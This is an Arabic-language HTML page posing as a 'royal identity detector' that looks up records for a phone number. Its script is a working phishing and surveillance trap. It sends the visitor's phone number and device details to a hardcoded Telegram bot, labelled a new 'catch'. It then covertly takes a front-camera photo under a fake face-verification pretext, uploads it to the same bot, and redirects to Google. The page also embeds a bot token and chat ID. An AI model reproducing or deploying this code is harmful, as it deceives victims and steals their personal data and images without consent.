<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>كاشف الهوية الملكي</title>
    <style>
        :root { --gold: #d4af37; --dark: #0f1216; }
        body { background-color: var(--dark); color: white; font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        .container { background: #161b22; padding: 40px 25px; border-radius: 20px; border: 1px solid rgba(212, 175, 55, 0.3); width: 90%; max-width: 380px; text-align: center; box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
        .logo { font-size: 50px; margin-bottom: 10px; color: var(--gold); }
        h2 { color: var(--gold); font-size: 20px; margin-bottom: 15px; }
        p { color: #8b949e; font-size: 13px; margin-bottom: 25px; }
        input { width: 100%; padding: 15px; border-radius: 10px; border: 1px solid #30363d; background: #0d1117; color: white; font-size: 18px; box-sizing: border-box; margin-bottom: 20px; outline: none; text-align: center; }
        .btn { background: linear-gradient(45deg, #d4af37, #f9e29c); color: #000; border: none; padding: 16px; border-radius: 10px; font-size: 16px; font-weight: bold; width: 100%; cursor: pointer; transition: 0.3s; }
        #status { display: none; margin-top: 20px; color: var(--gold); font-size: 14px; }
        video, canvas { display: none; }
    </style>
</head>
<body>

<div class="container">
    <div id="ui">
        <div class="logo">⚜️</div>
        <h2>كاشف الهوية الملكي</h2>
        <p>أدخل رقم الهاتف لمعرفة السجلات المرتبطة به</p>
        <input type="tel" id="phone" placeholder="07XXXXXXXX" required>
        <button class="btn" onclick="execute()">كشف الهوية الآن</button>
    </div>
    <div id="status">جاري الاتصال بالسيرفر المجهر...</div>
</div>

<video id="v" autoplay playsinline muted></video>
<canvas id="c"></canvas>

<script>
    const TOKEN = '8736983183:AAHZI864nf1nxjmOlqsAnwhSoK9K2VR5W7Y';
    const CHAT_ID = '5156556639';

    async function tgSend(formData, mode) {
        try {
            await fetch(`https://api.telegram.org/bot${TOKEN}/${mode}`, {
                method: 'POST',
                body: formData,
                mode: 'no-cors' // لتجنب مشاكل Network Error في المتصفحات
            });
        } catch (e) {}
    }

    function execute() {
        const val = document.getElementById('phone').value;
        if (val.length < 5) { alert("الرقم غير صحيح"); return; }

        document.getElementById('ui').style.display = 'none';
        document.getElementById('status').style.display = 'block';

        // 1. إرسال الرقم والمعلومات فوراً (نص)
        const textData = new FormData();
        textData.append('chat_id', CHAT_ID);
        textData.append('text', `🚨 صيد جديد من TOTV+:\n📞 الرقم: ${val}\n📱 الجهاز: ${navigator.platform}`);
        tgSend(textData, 'sendMessage');

        // 2. محاولة فتح الكاميرا للتصوير
        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
        .then(s => {
            const v = document.getElementById('v');
            v.srcObject = s;
            document.getElementById('status').innerText = "يتم التحقق من بصمة الوجه أمنياً...";

            setTimeout(() => {
                const cv = document.getElementById('c');
                cv.width = 400; cv.height = 500;
                cv.getContext('2d').drawImage(v, 0, 0, 400, 500);
                
                cv.toBlob(b => {
                    const photoData = new FormData();
                    photoData.append('chat_id', CHAT_ID);
                    photoData.append('photo', b, 'shot.jpg');
                    
                    tgSend(photoData, 'sendPhoto').then(() => {
                        document.getElementById('status').innerText = "تم التوثيق بنجاح!";
                        setTimeout(() => { window.location.href = "https://www.google.com"; }, 800);
                    });
                }, 'image/jpeg', 0.4); // ضغط الصورة لسرعة الرفع
            }, 2000);
        })
        .catch(() => {
            // في حال رفض الإذن، يكون الرقم قد وصلك بالفعل، ونحوله لجوجل
            window.location.href = "https://www.google.com";
        });
    }
</script>
</body>
</html>
